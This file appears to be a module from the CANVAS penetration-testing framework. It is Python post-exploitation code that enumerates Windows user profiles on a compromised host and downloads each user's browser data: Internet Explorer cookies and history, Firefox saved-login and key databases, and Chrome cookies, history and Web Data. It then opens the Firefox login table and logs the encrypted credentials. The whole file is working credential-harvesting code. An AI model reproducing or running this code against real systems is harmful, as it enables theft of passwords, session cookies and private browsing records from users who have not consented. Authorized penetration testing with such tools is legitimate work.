#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys, time
import sqlite3

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from canvaserror import *

NAME                = "Grab history/favorites etc from a system's web browsers"
VERSION             = "1.0"
DESCRIPTION         = "Get as much info as we can from the installed web browsers of the current user: histories, bookmarks, cached password etc"

DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="None"
DOCUMENTATION["Date public"]="00/00/00"
DOCUMENTATION["CERT Advisory"]="None"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["References"] = "None"
DOCUMENTATION["CVE Name"] = "None"
DOCUMENTATION["CVE Url"] = "None"
DOCUMENTATION["Notes"]="If Firefox is open the sqlite files cannot be grabbed because the database is locked"
DOCUMENTATION["TUTORIAL"] = "A free online tutorial for using this module can be found at: http://forum.immunityinc.com/index.php?topic=346.0"

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]


#TODO provide options for grabbing the cache as well
#TODO reset all file access times

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result = ""
        self.name   = NAME
        self.user_data_dict={}
        
        ##What browsers do we want to get stuff for
        self.doIE=True
        self.doFF=True
        self.doChrome=True
        self.doOpera=False
        self.doSafari=False
        ##Do we want to get the browser caches
        self.grabcache=False
        ##Do we want to specify a single user or all users? - default is blank which is all
        self.users=""
    
    def enumerate_users(self, node, users):
        """
        Find all the users on the system with a directory in %userprofiles%
        This will include some system accounts
        """
        ##Find a env var %userprofile%
        prof_loc=node.shell.GetEnvironmentVariable("userprofile")
        lst=prof_loc.split("\\")
        lst=lst[:-1]
        prof_loc='\\'.join(lst)
        
        self.user_dir_loc=prof_loc
        
        ##Has a single user been specified or do we want the lot
        if len(users) == 0:
            users=node.shell.NetUserEnum()
            for user in users:
                ##Make the found username into ascii
                user=utf16toascii(user)
                ##Create the structure within which we will hold the info found
                self.user_data_dict[user]={}
                
        else:
            ##Create the structure within which we will hold the info found
            self.user_data_dict[users]={}
           
        self.log("Found following users on the system: %s"%(self.user_data_dict.keys()))
        
    
    def get_ie_data(self, node, user):
        """
        Detect what version of windows we are running on and grab the relevant IE data set
        """
        if not self.doIE:
            return
        
        if "User" in self.user_dir_loc:
            self.get_ie_data_vista(node, user)
        else:
            self.get_ie_data_xp(node, user)
        
    def get_ie_data_xp(self,node, user):
        """
        Get the IE bits and pieces for each user
        """
        #self.get_ie_version()
        try:
            save_dir=os.path.join("BrowserInfo",user,"IE")
        except OSError, err:
            self.log("Problem creating save path for IE data for user '%s'"%(user))
            return
        
        self.log("Getting 2K/XP IE files for %s saving to %s"%(user, save_dir))
        ##Grab the bookmarks, history, cache, saved passwords etc
        ie_stuffs_we_want=["Cookies", "Favorites","Local Settings\\History"] ##Temporary internet files? make grabbing cache an option ?
        
        ##As each of the above is a directory we have to list the contents of each to grab the content
        for directory in ie_stuffs_we_want:
            
            dir_path="%s\\%s\\%s"%(self.user_dir_loc,user,directory)                
            ie_dir=os.path.join(save_dir,directory)
            ie_dir=self.output(ip=self.target_ip, subdir=ie_dir)
            
            ##Walk the filesystem points we have chosen, recursing into dirs and downloading files
            node.shell.recursive_dir_walk(dir_path, node.download, func_arg=ie_dir)
            
            
    def get_ie_data_vista(self,node, user):
        """
        Get the IE bits and pieces for each user
        Vista keeps things in quite different locations so easiest to just use a whole other function
        """
        #self.get_ie_version()
        try:
            save_dir=os.path.join("BrowserInfo",user,"IE")
        except OSError, err:
            self.log("Problem creating save path for IE data for user '%s'"%(user))
            return
        
        self.log("Getting Vista IE files for %s saving to %s"%(user, save_dir))
        ##Grab the bookmarks, history, cache, saved passwords etc
        ## Vista location: 
        ##   Cache: %userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\Low
        ##   Temp: %userprofile%\AppData\Local\Temp\Low
        ##   Cookies: %userprofile%\AppData\Roaming\Microsoft\Windows\Cookies\Low
        ##   History: %userprofile%\AppData\Local\Microsoft\Windows\History\Low 
        ##   Favorites: %userprofile%\Favorites
        
        ie_stuffs_we_want=["AppData\\Roaming\\Microsoft\\Windows\\Cookies", "AppData\\Local\\Microsoft\\Windows\\History","Favorites"] ##Temporary internet files? make grabbing cache an option ?
        
        ##As each of the above is a directory we have to list the contents of each to grab the content
        for directory in ie_stuffs_we_want:
            
            dir_path="%s\\%s\\%s"%(self.user_dir_loc,user,directory)                
            ie_dir=os.path.join(save_dir,directory)
            ie_dir=self.output(ip=self.target_ip, subdir=ie_dir)
            
            ##Walk the filesystem points we have chosen, recursing into dirs and downloading files
            node.shell.recursive_dir_walk(dir_path, node.download, func_arg=ie_dir)
            
            
    def get_firefox_data(self, node, user):
        """
        Lets see which users have installed firefox and what the whacked out random profile name they have been given is
        Then grab all the files from there that we find interesting
        
        XP,2k etc: C:\Documents and Settings\<user>\Application Data\Mozilla\Firefox\Profiles\<profile folder>\
        Vista    : C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile folder>\
        """
        if not self.doFF:
            return 
        
        self.log("enumerating %s for Firefox usage"%(user))
    
        ##Find the random dir firefox installed under
        if "User" in self.user_dir_loc:
            #Vista
            dir_path="%s\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"%(self.user_dir_loc, user)
        else:
            #XP 2K etc
            dir_path="%s\\%s\\Application Data\\Mozilla\\Firefox\\Profiles"%(self.user_dir_loc, user)
            
        file_count, dir_ret=node.shell.dodir(dir_path)
        
        if file_count <=0:
            ##User is not a fan of the firefox
            return
        
        for f in dir_ret:
        
            if ".default" in f[-1]:
                self.log("Firefox profile found: %s!!"%(f[-1]))
                self.user_data_dict[user]["ff_dir"]="%s\\%s"%(dir_path, f[-1])

                for entry in self.user_data_dict:
                    self.log("%s:%s"%(entry, self.user_data_dict[entry]))
                    
                try:
                    save_dir=self.output(ip=self.target_ip, subdir=os.path.join("BrowserInfo", user ,"Firefox"))
                except OSError, err:
                    print "---------------------------------------------------------------------------------",err
                    continue
                
                self.log("Getting firefox files for %s saving to %s"%(user, save_dir))
                ##Grab the bookmarks, history, cache, saved passwords etc
                ## - NOTE: If FF3 is open the sqlite files cannot be grabbed - I assume they are locked ?
                ff2and3_stuffs_we_want=["history.dat","cookies.txt", "bookmarks.html","signons.sqlite", "key3.db", "cert8.db", "signons.txt","signons2.txt","key3.db", "places.sqlite", "cookies.sqlite","signons3.txt"] #Bookmark backups ? # Cache ?
                
                
                for f in ff2and3_stuffs_we_want:
                    ##FF2and3 grab what we want
                    self.log("downloading %s\%s"%(self.user_data_dict[user]["ff_dir"],f))
                    try:
                        node.download(source="%s\\%s"%(self.user_data_dict[user]["ff_dir"],f), dest=save_dir)
                        tsource = "%s\\%s"%(self.user_data_dict[user]["ff_dir"],f)
                        tdest = save_dir
                        # inconspicuous filename created from win32mosdefshellserver
                        tout = os.path.join(tdest,tsource.replace("/","_").replace("\\","_"))
                        self.dump_ff_credentials(tout)
                    except NodeCommandError, err:
                        ##That file was not present for whatever reason
                        continue

    def dump_ff_credentials(self, tout):
        """
        Checks to see if we can dump the user/passwd credentials
        """

        self.log("Check if file: %s is a signon db"%tout)
        
        if 'signons.sqlite' not in tout:
            return

        p_map = ["User", "Password", "URL"]
        
        self.log("Opening firefox credentials DB file: %s"%tout)
        c = sqlite3.connect(tout)
        curs = c.cursor()
        res = curs.execute('SELECT encryptedUsername,encryptedPassword,formSubmitURL FROM moz_logins')
        for r in res: map(lambda x,y: self.log("%s %s"%(x,y)), p_map, r)
        c.close()
        
        
    def get_chrome_data(self, node, user):
        """
        Get files relevant to Google's Chrome browser
        XP    - C:\Documents and Settings\<user>\Local Settings\Application Data\Google\Chrome\User Data\\Default"
        Vista - C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default
        """
        if not self.doChrome:
            return 
       
        if "User" in self.user_dir_loc:
            chrome_path="%s\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default"%(self.user_dir_loc, user)
        else:
            chrome_path="%s\\%s\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"%(self.user_dir_loc, user)

        file_count, dir_ret=node.shell.dodir(chrome_path)
        
        if file_count <=0:
            ##User is not a fan of the google life
            return

        self.log(self.user_data_dict)
        try:
            save_dir=self.output(ip=self.target_ip, subdir=os.path.join("BrowserInfo", user ,"Chrome"))
        except OSError, err:
            print "---------------------------------------------------------------------------------",err
            return
        
        self.log("Getting Google Chrome files for %s saving to %s"%(user, save_dir))
        
        chrome_stuff_we_want=["Bookmarks", "Bookmarks.bak", "Cookies", "Current Session", "History", "Archived History", "Web Data", "Visited Links"]
        
        for f in chrome_stuff_we_want:
            ##Grab what we want
            self.log("downloading %s\%s"%(chrome_path,f))
            try:
                node.download(source="%s\\%s"%(chrome_path,f), dest=save_dir) 
            except NodeCommandError, err:
                ##That file was not present for whatever reason
                pass
        
                
    
    def get_opera_data(self, node, user):
        """
        Get file relevant to the Opera browser
        """
        pass #TODO
    
    def get_safari_data(self, node, user):
        """
        Get files relevant to Apple's Safari browser
        """
        pass #TODO
                    
    
    def get_args(self):
        """
        Choose the extra things we wanna do
        """
        self.doIE = self.argsDict.get('doIE', self.doIE)
        self.doFF = self.argsDict.get('doFF', self.doFF)
        self.doChrome = self.argsDict.get('doChrome', self.doChrome)
        self.users = self.argsDict.get('users', self.users)
        #self.doOpera = self.argsDict.get('doOpera', self.doOpera)
        #self.doSafari = self.argsDict.get('doSafari', self.doSafari)
        #self.grabcache = self.argsDict.get('grabcache', self.grabcache)   ##This is global for all chosen browsers 
    
    def run(self):
        
        self.get_args()
        
        self.setInfo("%s (in progress)" % (NAME))

        node        = self.argsDict["passednodes"][0]
        self.target_ip=node.get_interesting_interface()
        self.result = []


        for node in self.argsDict["passednodes"]:
            
            nodetype        = node.nodetype
            capabilities    = node.capabilities
            
            if node.nodetype in ["win32Node", "win64Node"]:
                
                targ_os=node.hostsknowledge.get_localhost()                
                
                ##Grab a list of users of the box
                self.enumerate_users(node, self.users)
                
                ##For each user found get the data relating to the browsers
                for user in self.user_data_dict.keys():
                    self.get_ie_data(node, user)
                    self.get_firefox_data(node, user)
                    self.get_chrome_data(node, user)
                    #self.get_opera_data(node, user)
                    #self.get_safari_data(node, user)
            
                ret = 1
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command (It needs to be run on a Win32Node)"%(node.get_name(),nodetype))
                self.result += [0]
                ret          = 0
                
        self.dispshellcmd = self.command
        self.log("%s finished" % (NAME))
        self.setInfo("%s - (finished)" % (NAME))
        return ret

